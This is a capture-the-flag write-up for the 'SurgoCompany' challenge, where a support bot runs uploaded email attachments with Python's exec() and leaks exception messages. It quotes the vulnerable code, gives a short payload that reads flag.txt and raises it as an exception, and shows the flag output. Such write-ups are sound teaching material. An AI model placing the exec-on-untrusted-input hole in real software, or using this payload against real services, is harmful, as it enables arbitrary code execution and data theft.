---
title: SurgoCompany
---
---

## Writeup: SurgoCompany (Misc/Pwn)

### Challenge Overview

* **Description:** SurgoCompany has a new customer service platform that allows users to describe issues and upload attachments. The goal is to read `flag.txt` located in the same directory as the source code.
* **Vulnerability:** Insecure Deserialization / Arbitrary Code Execution via Python's `exec()` function.
* **Flag:** `pascalCTF{ch3_5urG4t4_d1_ch4ll3ng3}`

### 1. Analysis

The provided source code reveals a service that polls an IMAP inbox for replies to customer support emails. When an email with an attachment is received, it passes the file path to a function called `check_attachment()`.

The vulnerability lies in this specific block:

```python
def check_attachment(filepath):
    # ... code to read file ...
    try:
        with open(filepath, "r") as f:
            content = f.read()
    except Exception as e:
        # ...
        return

    try:
        exec(content)  # <--- DANGER: Executes arbitrary Python code
        print("The attachment did not pass the security check.")
    except Exception as e:
        print("The attachment passed the security check.")
        print(f"Error: {e}") # <--- Information Leak

```

The "security check" is logically flawed: it executes the content of the attachment. If the code runs successfully, it is deemed "dangerous." If it raises an exception, the exception message is printed to the user, and the file is deemed "safe."

### 2. Exploitation Strategy

To solve this, we need to provide a Python script as an attachment that:

1. **Reads** the `flag.txt` file from the local filesystem.
2. **Triggers an Exception** containing the contents of that file so the server prints the flag in the `Error: {e}` output.

### 3. Execution

The following payload was used in an attached file (e.g., `exploit.py` or `2.txt`):

```python
with open('flag.txt', 'r') as f:
    flag = f.read()
    raise Exception(flag)

```

**Steps taken:**

1. Connected to the challenge service via `nc surgobot.ctf.pascalctf.it 6005`.
2. Entered the generated email address: `user-ivazan1w@skillissue.it`.
3. Accessed the webmail interface to find the Support Request email and its subject (Request ID/PID).
4. Replied to the email, attaching the payload.
5. Observed the Netcat output as the bot processed the email.

### 4. Results

The bot executed the script, which raised an exception containing the flag. The `except` block caught this and printed the flag to the terminal:

```text
Checking attachment '/tmp/tmpmeaak3je/2.txt'...
pascalCTF{ch3_5urG4t4_d1_ch4ll3ng3}

The attachment passed the security check.
Error: pascalCTF{ch3_5urG4t4_d1_ch4ll3ng3}

```

---